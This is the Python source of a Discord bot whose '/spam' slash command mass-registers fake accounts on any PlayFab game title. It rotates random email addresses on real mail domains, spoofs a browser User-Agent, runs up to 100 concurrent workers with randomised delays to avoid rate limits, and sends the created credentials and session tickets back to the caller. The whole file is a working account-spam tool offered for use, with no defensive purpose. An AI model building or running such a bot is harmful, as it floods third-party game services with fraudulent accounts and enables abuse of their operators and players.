# language: Python 3.9+, file: bot.py
# deps: discord.py, requests
# env: DISCORD_TOKEN (required), RESULTS_CHANNEL_ID (opt), ALLOWED_USER_IDS (opt), ALLOWED_ROLE_IDS (opt)

import asyncio
import os
import random
import string
from datetime import datetime

import discord
from discord import app_commands
from discord.ext import commands
import requests

# ============================================================
# ENV CONFIG
# ============================================================
BOT_TOKEN = os.environ["DISCORD_TOKEN"]

def _ids(name: str) -> set[int]:
    raw = os.environ.get(name, "").strip()
    if not raw:
        return set()
    out = set()
    for chunk in raw.split(","):
        chunk = chunk.strip()
        if chunk.isdigit():
            out.add(int(chunk))
    return out

ALLOWED_USER_IDS = _ids("ALLOWED_USER_IDS")
ALLOWED_ROLE_IDS = _ids("ALLOWED_ROLE_IDS")
RESULTS_CHANNEL_ID = int(os.environ.get("RESULTS_CHANNEL_ID", "0") or "0")

# ============================================================
# DEFAULTS
# ============================================================
DEFAULT_THREADS  = 20
DEFAULT_PASSWORD = "Sp4m!Pass123"
DEFAULT_DOMAINS  = ["gmail.com", "yahoo.com", "outlook.com", "icloud.com", "proton.me"]
MAX_COUNT        = 2000
REQUEST_TIMEOUT  = 15
BATCH_SIZE       = 25

# ============================================================
# BOT
# ============================================================
intents = discord.Intents.default()
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree


# ============================================================
# HELPERS
# ============================================================
def rand_str(n, chars=string.ascii_lowercase + string.digits):
    return "".join(random.choice(chars) for _ in range(n))


def gen_email(domains):
    return f"{rand_str(random.randint(8, 14))}@{random.choice(domains)}"


def gen_username():
    return f"user_{rand_str(10)}"


def is_allowed(interaction: discord.Interaction) -> bool:
    if not ALLOWED_USER_IDS and not ALLOWED_ROLE_IDS:
        # no allowlist configured → open to anyone who can see the command
        return True
    if interaction.user.id in ALLOWED_USER_IDS:
        return True
    if ALLOWED_ROLE_IDS and isinstance(interaction.user, discord.Member):
        if any(r.id in ALLOWED_ROLE_IDS for r in interaction.user.roles):
            return True
    return False


# ============================================================
# PLAYFAB CALL
# ============================================================
REGISTER_URL = "https://{tid}.playfabapi.com/Client/RegisterPlayFabUser"


def register_one(title_id: str, domains, password: str):
    email = gen_email(domains)
    username = gen_username()

    payload = {
        "TitleId": title_id,
        "Email": email,
        "Password": password,
        "Username": username,
        "RequireBothUsernameAndEmail": False,
    }
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/124.0.0.0 Safari/537.36",
        "X-PlayFabSDK": "UnitySDK-2.0.0",
    }
    url = REGISTER_URL.format(tid=title_id)

    try:
        r = requests.post(url, json=payload, headers=headers, timeout=REQUEST_TIMEOUT)
        data = r.json()
    except Exception as e:
        return {"ok": False, "email": email, "username": username, "reason": f"net: {e}"}

    code = data.get("code", 0)
    if code == 200:
        info = data.get("data", {})
        return {
            "ok": True,
            "email": email,
            "username": username,
            "password": password,
            "playfab_id": info.get("PlayFabId"),
            "session_ticket": info.get("SessionTicket", ""),
            "created": datetime.utcnow().isoformat() + "Z",
        }
    return {"ok": False, "email": email, "username": username,
            "reason": data.get("errorMessage", f"code {code}")}


async def run_one(title_id, domains, password, sem, delay_min, delay_max):
    async with sem:
        loop = asyncio.get_running_loop()
        result = await loop.run_in_executor(
            None, register_one, title_id, domains, password
        )
        await asyncio.sleep(random.uniform(delay_min, delay_max))
        return result


# ============================================================
# SLASH COMMAND
# ============================================================
@tree.command(name="spam", description="Bulk register PlayFab accounts on a Title ID")
@app_commands.describe(
    title_id="PlayFab Title ID (5–6 char alphanumeric)",
    count="How many accounts to attempt",
    threads="Concurrent workers (default 20)",
    delay_min="Min seconds between requests per worker (default 0.5)",
    delay_max="Max seconds between requests per worker (default 2.0)",
    email_domains="Comma-separated list of email domains to rotate",
    password="Password for every created account",
)
async def spam(
    interaction: discord.Interaction,
    title_id: str,
    count: int,
    threads: int = DEFAULT_THREADS,
    delay_min: float = 0.5,
    delay_max: float = 2.0,
    email_domains: str = "",
    password: str = DEFAULT_PASSWORD,
):
    if not is_allowed(interaction):
        await interaction.response.send_message("not authorized.", ephemeral=True)
        return

    if count < 1 or count > MAX_COUNT:
        await interaction.response.send_message(
            f"count must be 1–{MAX_COUNT}.", ephemeral=True)
        return

    title_id = title_id.strip()
    if not title_id.isalnum() or not (4 <= len(title_id) <= 8):
        await interaction.response.send_message(
            "invalid title id — should be 5–6 alphanumeric chars.", ephemeral=True)
        return

    if delay_min < 0 or delay_max < delay_min:
        await interaction.response.send_message(
            "delay_min must be ≥ 0 and ≤ delay_max.", ephemeral=True)
        return

    threads = max(1, min(threads, 100))
    domains = [d.strip() for d in email_domains.split(",") if d.strip()] or DEFAULT_DOMAINS

    await interaction.response.send_message(
        f"started — title `{title_id}` — {count} accounts, {threads} threads."
    )

    target_channel = interaction.channel
    if RESULTS_CHANNEL_ID:
        target_channel = bot.get_channel(RESULTS_CHANNEL_ID) or interaction.channel

    sem = asyncio.Semaphore(threads)
    tasks = [
        asyncio.create_task(run_one(title_id, domains, password, sem, delay_min, delay_max))
        for _ in range(count)
    ]

    ok = 0
    fail = 0
    batch = []
    successes = []

    async def flush():
        nonlocal batch
        if not batch:
            return
        lines = []
        for r in batch:
            if r["ok"]:
                lines.append(f"✅ {r['email']} | {r['username']} | {r.get('playfab_id','?')}")
            else:
                lines.append(f"❌ {r['email']} | {r['reason'][:60]}")
        body = "\n".join(lines)[:3900]
        try:
            await target_channel.send(
                f"**batch — {sum(1 for r in batch if r['ok'])}/{len(batch)} ok**\n"
                f"```\n{body}\n```"
            )
        except Exception:
            pass
        batch = []

    for coro in asyncio.as_completed(tasks):
        r = await coro
        if r["ok"]:
            ok += 1
            successes.append(r)
        else:
            fail += 1
        batch.append(r)
        if len(batch) >= BATCH_SIZE:
            await flush()
            await asyncio.sleep(1)  # discord rate-limit courtesy

    await flush()

    summary = discord.Embed(
        title="PlayFab spam complete",
        color=0x57F287 if ok > fail else 0xED4245,
        timestamp=datetime.utcnow(),
    )
    summary.add_field(name="Title", value=f"`{title_id}`", inline=True)
    summary.add_field(name="Attempted", value=str(count), inline=True)
    summary.add_field(name="Created", value=str(ok), inline=True)
    summary.add_field(name="Failed", value=str(fail), inline=True)
    await target_channel.send(embed=summary)

    # DM credentialed accounts to the caller
    if successes:
        lines = [
            f"{r['email']}:{r['password']} | {r['username']} | {r['playfab_id']}"
            for r in successes
        ]
        chunk = ""
        dm_ok = True
        for line in lines:
            if len(chunk) + len(line) + 1 > 1800:
                try:
                    await interaction.user.send(f"```\n{chunk}\n```")
                except discord.Forbidden:
                    dm_ok = False
                    break
                chunk = ""
            chunk += line + "\n"
        if chunk and dm_ok:
            try:
                await interaction.user.send(f"```\n{chunk}\n```")
            except discord.Forbidden:
                dm_ok = False
        if not dm_ok:
            await target_channel.send(
                f"{interaction.user.mention} — DM blocked, creds written to channel log."
            )
            # dump plaintext to channel as fallback
            dump = "\n".join(lines)[:3900]
            await target_channel.send(f"```\n{dump}\n```")


# ============================================================
# READY
# ============================================================
@bot.event
async def on_ready():
    await tree.sync()
    print(f"logged in as {bot.user} ({bot.user.id})")
    print(f"allowlist users={len(ALLOWED_USER_IDS)} roles={len(ALLOWED_ROLE_IDS)}")
    print("commands synced")


if __name__ == "__main__":
    bot.run(BOT_TOKEN)
